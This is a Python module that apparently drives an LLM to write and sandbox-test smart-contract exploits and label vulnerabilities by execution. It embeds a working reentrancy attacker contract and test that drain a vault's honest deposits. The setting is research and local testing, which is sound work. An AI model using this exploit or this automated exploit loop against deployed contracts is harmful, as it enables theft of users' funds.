"""Module D step two: the LLM exploit agent entrypoint.

Wraps an LLM around the step one drain-and-assert mechanism. For a flagged
victim contract it asks the LLM to write a proof of concept exploit, runs it in
the Foundry sandbox, and on failure feeds the captured revert or compiler error
back for another attempt, up to a retry cap. The final pass/fail is written as
an execution grounded label to data/labels.csv.

Run:
    python -m agent.run_agent --victim exploits/src/VulnerableVault.sol --vuln reentrancy

Offline self test (no API key, proves the sandbox + labeling path end to end
against real forge execution using a built in reference exploit):
    python -m agent.run_agent --victim exploits/src/VulnerableVault.sol --vuln reentrancy --self-test

The label is ALWAYS grounded in a real forge test run. The only thing --self-test
changes is where the candidate exploit comes from (a built in reference instead
of the LLM), so the plumbing can be validated without network access.
"""

from __future__ import annotations

import argparse
import os
import re
import shutil
import sys
from pathlib import Path
from typing import Dict, Optional, Tuple

from agent import prompts
from agent.labels import Label, append_label
from agent.sandbox import Sandbox, SandboxResult

# Default model. Chosen by checking the current model list rather than from
# memory (see agent/README.md): claude-opus-5 is the current default Claude
# model. Overridable with --model.
DEFAULT_MODEL = "claude-opus-5"
DEFAULT_RETRIES = 3


# ---------------------------------------------------------------------------
# Repo layout
# ---------------------------------------------------------------------------

def repo_root() -> Path:
    """The project root, two levels up from this file (agent/run_agent.py)."""
    return Path(__file__).resolve().parent.parent


def resolve_forge() -> str:
    """Locate the forge binary.

    Prefers whatever is on PATH, then falls back to the standard foundryup
    install location, so the agent runs whether or not the shell has sourced
    the foundry env.
    """
    found = shutil.which("forge")
    if found:
        return found
    home = Path.home() / ".foundry" / "bin"
    for name in ("forge.exe", "forge"):
        candidate = home / name
        if candidate.exists():
            return str(candidate)
    # Let subprocess raise a clear error later if it truly is not installed.
    return "forge"


# ---------------------------------------------------------------------------
# Victim inspection
# ---------------------------------------------------------------------------

def inspect_victim(victim_path: Path) -> Tuple[str, str, str]:
    """Return (source_text, primary_contract_name, pragma) for the victim.

    The primary contract name is the last top level `contract X` declaration,
    which for these single-purpose victims is the one under test. The pragma is
    normalized to a fixed 0.8.x so the generated files pin cleanly; anything not
    already a fixed 0.8 version falls back to the project's 0.8.28 pin.
    """
    source = victim_path.read_text(encoding="utf-8", errors="replace")

    names = re.findall(r"^\s*contract\s+(\w+)", source, re.MULTILINE)
    contract_name = names[-1] if names else victim_path.stem

    pragma = "0.8.28"
    match = re.search(r"pragma\s+solidity\s+([^;]+);", source)
    if match:
        raw = match.group(1).strip()
        exact = re.fullmatch(r"0\.8\.\d+", raw)
        if exact:
            pragma = raw

    return source, contract_name, pragma


# ---------------------------------------------------------------------------
# LLM response parsing
# ---------------------------------------------------------------------------

def parse_exploit_files(response_text: str) -> Dict[str, str]:
    """Extract the generated files from the LLM response.

    Splits on the BEGIN_FILE: <path> ... END_FILE markers defined in prompts.py.
    A fenced code block wrapper (```solidity ... ```) around the content, which
    models often add out of habit, is stripped. Returns {relative_path: source}.
    """
    files: Dict[str, str] = {}
    pattern = re.compile(
        rf"{re.escape(prompts.FILE_BEGIN)}\s*(?P<path>\S+)\s*\n"
        rf"(?P<body>.*?)"
        rf"\n\s*{re.escape(prompts.FILE_END)}",
        re.DOTALL,
    )
    for m in pattern.finditer(response_text):
        path = m.group("path").strip()
        body = _strip_code_fence(m.group("body"))
        files[path] = body
    return files


def _strip_code_fence(text: str) -> str:
    """Remove a leading ```lang line and trailing ``` if the model added them."""
    text = text.strip("\n")
    lines = text.split("\n")
    if lines and lines[0].lstrip().startswith("```"):
        lines = lines[1:]
    if lines and lines[-1].strip().startswith("```"):
        lines = lines[:-1]
    return "\n".join(lines).strip() + "\n"


# ---------------------------------------------------------------------------
# LLM client
# ---------------------------------------------------------------------------

def require_api_key() -> str:
    """Read ANTHROPIC_API_KEY, failing loudly with guidance if it is missing."""
    key = os.environ.get("ANTHROPIC_API_KEY", "").strip()
    if not key:
        raise SystemExit(
            "ERROR: ANTHROPIC_API_KEY is not set.\n"
            "The exploit agent needs Anthropic API access to generate exploits.\n"
            "Set it and retry, for example (PowerShell):\n"
            '    $env:ANTHROPIC_API_KEY = "sk-ant-..."\n'
            "or run with --self-test to validate the sandbox and labeling path "
            "offline using the built in reference exploit."
        )
    return key


def call_llm(model: str, system_prompt: str, user_prompt: str) -> str:
    """One LLM call. Returns the concatenated text content of the response.

    The anthropic SDK interface is used as verified at runtime against the
    installed package (see agent/README.md): anthropic.Anthropic() reads the key
    from the environment, and messages.create returns content as a list of typed
    blocks, of which we keep the text blocks.
    """
    import anthropic  # imported lazily so --self-test needs no network stack

    client = anthropic.Anthropic()
    try:
        response = client.messages.create(
            model=model,
            max_tokens=16000,
            system=system_prompt,
            # Adaptive thinking: recommended default for a task this involved.
            thinking={"type": "adaptive"},
            messages=[{"role": "user", "content": user_prompt}],
        )
    except anthropic.AuthenticationError as exc:
        raise SystemExit(f"ERROR: Anthropic authentication failed: {exc}")
    except anthropic.APIStatusError as exc:
        raise SystemExit(f"ERROR: Anthropic API error ({exc.status_code}): {exc}")
    except anthropic.APIConnectionError as exc:
        raise SystemExit(f"ERROR: could not reach the Anthropic API: {exc}")

    return "".join(
        block.text for block in response.content if getattr(block, "type", None) == "text"
    )


# ---------------------------------------------------------------------------
# Built in reference candidate (offline self test only)
# ---------------------------------------------------------------------------
#
# Used only by --self-test. It is a known good reentrancy exploit for
# VulnerableVault, formatted exactly as the LLM is asked to format its answer,
# so it flows through the identical parse -> write -> forge test -> label path.
# This lets the whole mechanism be validated with no API key. It is NOT a mock:
# the label it produces still comes from a real forge test run.

def reference_candidate_response(victim_contract_name: str, victim_basename: str, pragma: str) -> str:
    attacker = f"""// SPDX-License-Identifier: MIT
pragma solidity {pragma};

import {{{victim_contract_name}}} from "./{victim_basename}";

// Reference reentrancy exploit (offline self test candidate).
contract Attacker {{
    {victim_contract_name} public immutable vault;
    address public immutable owner;
    uint256 public stake;

    constructor({victim_contract_name} _vault) {{
        vault = _vault;
        owner = msg.sender;
    }}

    function attack() external payable {{
        require(msg.value > 0, "need a stake");
        stake = msg.value;
        vault.deposit{{value: msg.value}}();
        vault.withdraw();
    }}

    // Re-enter while the vault can still pay a full stake. This is the step
    // that drains the pool: the vault has not yet zeroed our balance.
    receive() external payable {{
        if (address(vault).balance >= stake) {{
            vault.withdraw();
        }}
    }}

    function sweep() external {{
        require(msg.sender == owner, "only owner");
        (bool ok, ) = owner.call{{value: address(this).balance}}("");
        require(ok, "sweep failed");
    }}
}}
"""

    test = f"""// SPDX-License-Identifier: MIT
pragma solidity {pragma};

import {{Test, console2}} from "forge-std/Test.sol";
import {{{victim_contract_name}}} from "../../src/generated/{victim_basename}";
import {{Attacker}} from "../../src/generated/Attacker.sol";

// Reference PoC (offline self test). Asserts the real broken invariant.
contract Exploit is Test {{
    {victim_contract_name} internal vault;
    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");
    address internal carol = makeAddr("carol");
    address internal blackhat = makeAddr("blackhat");

    uint256 internal constant HONEST_DEPOSIT = 10 ether;
    uint256 internal constant ATTACKER_STAKE = 1 ether;

    function setUp() public {{
        vault = new {victim_contract_name}();
        hoax(alice, HONEST_DEPOSIT);
        vault.deposit{{value: HONEST_DEPOSIT}}();
        hoax(bob, HONEST_DEPOSIT);
        vault.deposit{{value: HONEST_DEPOSIT}}();
        hoax(carol, HONEST_DEPOSIT);
        vault.deposit{{value: HONEST_DEPOSIT}}();
    }}

    function test_exploit_drains_vault() public {{
        uint256 honestPool = 3 * HONEST_DEPOSIT;
        uint256 vaultBefore = address(vault).balance;

        vm.prank(blackhat);
        Attacker attacker = new Attacker(vault);
        vm.deal(blackhat, ATTACKER_STAKE);
        vm.prank(blackhat);
        attacker.attack{{value: ATTACKER_STAKE}}();
        vm.prank(blackhat);
        attacker.sweep();

        uint256 vaultAfter = address(vault).balance;
        uint256 profit = blackhat.balance - ATTACKER_STAKE;

        // Evidence log lines the sandbox reads back.
        console2.log("vault_before_wei", vaultBefore);
        console2.log("vault_after_wei", vaultAfter);
        console2.log("attacker_profit_wei", profit);

        // Broken invariant: vault drained and attacker richer by the pool.
        assertApproxEqAbs(vaultAfter, 0, ATTACKER_STAKE, "vault was not drained");
        assertGt(blackhat.balance, ATTACKER_STAKE, "attacker did not profit");
        assertGe(profit, honestPool, "attacker did not capture the honest pool");
    }}
}}
"""

    return (
        f"{prompts.FILE_BEGIN} {prompts.ATTACKER_PATH}\n{attacker}{prompts.FILE_END}\n"
        f"{prompts.FILE_BEGIN} {prompts.TEST_PATH}\n{test}{prompts.FILE_END}\n"
    )


# ---------------------------------------------------------------------------
# The loop
# ---------------------------------------------------------------------------

def run_victim(
    victim_path: Path,
    vuln_class: str,
    retries: int,
    model: str,
    self_test: bool,
    exploits_dir: Path,
    labels_path: Path,
) -> Label:
    """Run the generate -> execute -> retry loop for one victim, then label it.

    Control flow:
      - prepare the sandbox (copy victim into src/generated/)
      - for each attempt up to `retries`:
          1. build the prompt, including the previous attempt's error as feedback
          2. get candidate files (from the LLM, or the reference in self test)
          3. write them into the sandbox
          4. run forge test scoped to the generated test
          5. pass  -> stop, this is a confirmed label
             fail  -> keep the error as feedback for the next attempt
      - stop on the first pass or when attempts run out
      - write one execution grounded label row
    """
    source, contract_name, pragma = inspect_victim(victim_path)
    profile = prompts.VULN_PROFILES.get(vuln_class, prompts.VULN_PROFILES["reentrancy"])
    invariant = profile["invariant"]

    sandbox = Sandbox(exploits_dir, forge_bin=resolve_forge())
    victim_basename = sandbox.prepare_victim(victim_path)

    feedback: Optional[str] = None
    attempts = 0
    last_error = "no attempt produced a runnable exploit"
    result: Optional[SandboxResult] = None

    for attempt in range(1, retries + 1):
        attempts = attempt
        print(f"\n--- attempt {attempt}/{retries} for {contract_name} ({vuln_class}) ---")

        # 1 + 2: obtain candidate files.
        if self_test:
            print("  self-test: using the built in reference exploit candidate")
            response_text = reference_candidate_response(contract_name, victim_basename, pragma)
        else:
            user_prompt = prompts.build_user_prompt(
                victim_contract_name=contract_name,
                victim_basename=victim_basename,
                victim_source=source,
                vuln_class=vuln_class,
                pragma=pragma,
                feedback=feedback,
            )
            print(f"  asking {model} for an exploit"
                  + (" (with feedback from the last failure)" if feedback else ""))
            response_text = call_llm(model, prompts.SYSTEM_PROMPT, user_prompt)

        files = parse_exploit_files(response_text)
        missing = [p for p in (prompts.ATTACKER_PATH, prompts.TEST_PATH) if p not in files]
        if missing:
            # A malformed response is itself a failure we can feed back.
            last_error = (
                "your response did not contain the required files: "
                + ", ".join(missing)
                + ". Emit both files between the exact markers."
            )
            feedback = last_error
            print(f"  parse failed: {last_error}")
            continue

        # 3: write into the isolated sandbox (refuses non generated paths).
        sandbox.refresh_victim(victim_path)
        sandbox.write_generated_files(files, victim_basename)

        # 4: execute.
        print("  running forge test on the generated exploit...")
        result = sandbox.run_generated_test()

        # 5: branch on the real execution result.
        if result.passed:
            print(f"  PASS: {result.evidence}")
            # Keep the passing generated files on disk as the artifact. They live
            # in isolated folders and compile, so a plain `forge test` still
            # passes step one alongside them.
            # Mark provenance so a reader of labels.csv can tell an offline
            # self-test row (built in reference candidate) from a live LLM row.
            evidence = result.evidence
            if self_test:
                evidence = f"(self-test reference) {evidence}"
            label = Label(
                contract=contract_name,
                vuln_class=vuln_class,
                confirmed=True,
                attempts=attempts,
                invariant_asserted=invariant,
                evidence=evidence,
            )
            append_label(label, labels_path)
            return label

        last_error = result.error_text
        feedback = last_error
        print(f"  FAIL: {_short(last_error)}")

    # Retries exhausted without a pass. Remove the generated files so the project
    # still builds, then write a not-confirmed label with the final error.
    sandbox.cleanup()
    label = Label(
        contract=contract_name,
        vuln_class=vuln_class,
        confirmed=False,
        attempts=attempts,
        invariant_asserted=invariant,
        evidence=_short(last_error, 200),
    )
    append_label(label, labels_path)
    return label


def _short(text: str, limit: int = 160) -> str:
    text = " ".join((text or "").split())
    return text if len(text) <= limit else text[:limit] + " ...[truncated]"


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="python -m agent.run_agent",
        description="Module D step two: generate an exploit with an LLM, confirm "
        "it by execution under Foundry, and emit an execution grounded label.",
    )
    parser.add_argument(
        "--victim",
        required=True,
        help="path to the victim Solidity contract (e.g. exploits/src/VulnerableVault.sol)",
    )
    parser.add_argument(
        "--vuln",
        default="reentrancy",
        choices=sorted(prompts.VULN_PROFILES.keys()),
        help="suspected vulnerability class",
    )
    parser.add_argument(
        "--retries",
        type=int,
        default=DEFAULT_RETRIES,
        help="maximum LLM attempts before giving up",
    )
    parser.add_argument(
        "--model",
        default=DEFAULT_MODEL,
        help="Anthropic model id",
    )
    parser.add_argument(
        "--self-test",
        action="store_true",
        help="run the loop offline with a built in reference exploit (no API key "
        "needed); the label still comes from a real forge test run",
    )
    parser.add_argument(
        "--labels",
        default=None,
        help="labels CSV path (default: data/labels.csv at the repo root)",
    )
    return parser


def main(argv=None) -> int:
    args = build_parser().parse_args(argv)

    root = repo_root()
    victim_path = Path(args.victim)
    if not victim_path.is_absolute():
        victim_path = (root / victim_path).resolve()
    if not victim_path.is_file():
        print(f"ERROR: victim not found: {victim_path}", file=sys.stderr)
        return 2

    exploits_dir = root / "exploits"
    if not (exploits_dir / "foundry.toml").is_file():
        print(f"ERROR: Foundry sandbox not found at {exploits_dir}", file=sys.stderr)
        return 2

    labels_path = Path(args.labels).resolve() if args.labels else (root / "data" / "labels.csv")

    # Fail loudly on a missing key before doing any work, unless self testing.
    if not args.self_test:
        require_api_key()

    print("=" * 62)
    print("MODULE D STEP TWO: LLM EXPLOIT AGENT")
    print("=" * 62)
    print(f"  victim   : {victim_path}")
    print(f"  vuln     : {args.vuln}")
    print(f"  mode     : {'self-test (offline reference)' if args.self_test else 'live LLM ' + args.model}")
    print(f"  retries  : {args.retries}")
    print(f"  labels   : {labels_path}")

    label = run_victim(
        victim_path=victim_path,
        vuln_class=args.vuln,
        retries=args.retries,
        model=args.model,
        self_test=args.self_test,
        exploits_dir=exploits_dir,
        labels_path=labels_path,
    )

    print("\n" + "=" * 62)
    print("RESULT")
    print("=" * 62)
    print(f"  contract           : {label.contract}")
    print(f"  vuln_class         : {label.vuln_class}")
    print(f"  confirmed          : {'true' if label.confirmed else 'false'}")
    print(f"  attempts           : {label.attempts}")
    print(f"  invariant_asserted : {label.invariant_asserted}")
    print(f"  evidence           : {label.evidence}")
    print(f"  label appended to  : {labels_path}")
    print("=" * 62)

    # Exit 0 on a confirmed drain, 1 otherwise, so the loop is scriptable.
    return 0 if label.confirmed else 1


if __name__ == "__main__":
    raise SystemExit(main())
